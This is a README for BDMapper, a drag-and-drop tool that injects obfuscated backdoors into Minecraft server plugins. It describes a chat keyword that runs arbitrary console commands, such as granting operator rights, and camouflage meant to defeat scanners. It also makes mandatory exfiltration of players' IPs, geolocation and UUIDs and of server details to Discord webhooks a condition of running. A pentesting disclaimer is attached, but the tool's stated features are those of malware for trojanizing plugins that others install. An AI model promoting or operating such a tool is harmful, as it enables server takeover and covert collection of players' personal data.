<div align="center"><h1>BDMapper — Professional Backdoor Injection Framework for Minecraft Plugins</h1></div>
<div align="center"><img alt="Logo" src="l.png"/></div>
<div align="center">
  <a href="https://github.com/VoxelHax/BDMapper/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE_(CLICK)-blue?style=for-the-badge"/></a>
</div>

**Languages:** English, Русский

---

## Overview

**BDMapper (BackDoorMapper)** is a modern, high‑performance, and universal tool for injecting backdoors into Bukkit, Spigot, Paper, and any of their forks. Its key advantage is **full independence from the target plugin** – injection is performed without any manual adaptation of the code to each specific JAR file. The built‑in camouflage engine makes the injected code extremely difficult to detect, even for specialised automated scanners.

The product is developed by **NyashSystem** and is intended exclusively for authorised penetration testing and security evaluation of Minecraft server infrastructures. **Unauthorised use of BDMapper without explicit written permission from the server owner is strictly prohibited.** I, as the sole developer, assume no liability for any damage caused by unauthorised or illegal use of this tool.

---

## Key Features

- **Complete Compatibility** – Supports all versions of Bukkit and its forks without any version restrictions.
- **Built‑in Backdoor** – A ready‑to‑use module activated by a keyword in chat.
- **Automatic JDK Download** – The tool automatically selects and installs the required Java version, freeing the user from version‑compatibility concerns.
- **Advanced Camouflage Engine** – Injected code is obfuscated and stylised to match the original plugin’s bytecode, effectively resisting both manual reverse‑engineering and signature‑based scanners.
- **Mandatory Two‑Channel Telemetry** – The injector requires **two separate Discord Webhook URLs** to operate:  
  - one for **player connection events** (including full geolocation and client data);  
  - another for **server startup logs** (core information, plugin list, configuration, etc.).  
  *These data are critical for monitoring and analysing test results. Injection will not proceed without both webhooks.*

---

## Installation

1. Download the latest `BDMapper.exe` from the [Releases](https://github.com/VoxelHax/BDMapper/releases/latest) page.  
2. Place the executable in any directory of your choice. No additional environment setup is required.

---

## Usage Instructions

The workflow is extremely simple and follows a **drag‑and‑drop** approach:

1. Drag the target `.jar` plugin file onto `BDMapper.exe`.  
2. A configuration dialog will appear, prompting you to provide:
   - **Activation Key** – a secret word that, when prefixed to a chat message, will execute the remainder as a console command (e.g., `#console`).  
   - **Player Logs Webhook** – the URL where data about each player connection (IP, geolocation, client, UUID, etc.) will be sent. **This field is mandatory.**  
   - **Server Logs Webhook** – the URL for receiving system startup information (core, Bukkit version, plugin list, server IP, etc.). **This field is also mandatory.**  
3. After you enter the Player Logs Webhook URL and press Enter, the patching process will start automatically (including JDK download if required). The modified plugin will be saved in the same directory as the original, with .bdm appended to the filename (e.g., MyPlugin.bdm.jar).

No command‑line parameters or complex configuration files are needed.

---

## Telemetry Data Collected

### 1. Player Logs (sent on each connection)
- Player skin texture URL or hash  
- Player UUID  
- Client brand (Fabric, Forge, Vanilla, etc.)  
- Client version (as reported by the player)  
- Geolocation (country and city, e.g., *United Kingdom > London*)  
- Public IP address and port  

### 2. Server Logs (sent once at startup)
- Server core (Paper, Spigot, Bukkit, Purpur, etc.)  
- Name of the injected plugin  
- Bukkit API version  
- Hosting country (server geolocation)  
- Public server IP and port  
- The configured activation keyword  
- Complete list of all installed plugins (for environmental profiling)  

**Important:** All data are transmitted exclusively to the webhooks you provide. No information is stored by the developer, shared with third parties, or used for any other purpose. Refusal to provide either webhook will abort the injection process.

---

## Built‑in Backdoor Mechanism

The backdoor is deliberately simple yet functionally effective: any chat message beginning with the configured **activation key** is interpreted as a console command and executed by the server.

**Example:**  
With the key `#console`, typing in chat:  
`#console op MyName`  
will execute `op MyName` in the console, granting operator privileges to the player `MyName`.

---

## Camouflage Engine

All injected code is deeply obfuscated and adapted to mimic the style of the original plugin, making it nearly indistinguishable from legitimate components. This significantly hinders detection through both manual reverse‑engineering and most automated scanners.

---

## Advanced Usage (For Expert Users)

While BDMapper is optimised for its built‑in backdoor, advanced users may replace it with a custom exploit by pre‑injecting the necessary classes into the target plugin. This procedure requires manual bytecode manipulation and is not covered in this guide. For the vast majority of testing scenarios, the standard backdoor and telemetry functionality is sufficient.

---

## Legal Disclaimer and Liability

BDMapper is provided **solely for legitimate security testing, penetration testing, and educational awareness**. Any use of this tool without prior written consent from the owner of the target system is illegal and unethical.

**I, the developer of BDMapper (NyashSystem), accept no responsibility for any direct or indirect damage resulting from unauthorised, unsanctioned, or illegal use of this software.** The user agrees to comply with all applicable laws and regulations and bears full personal responsibility for the consequences of their actions.
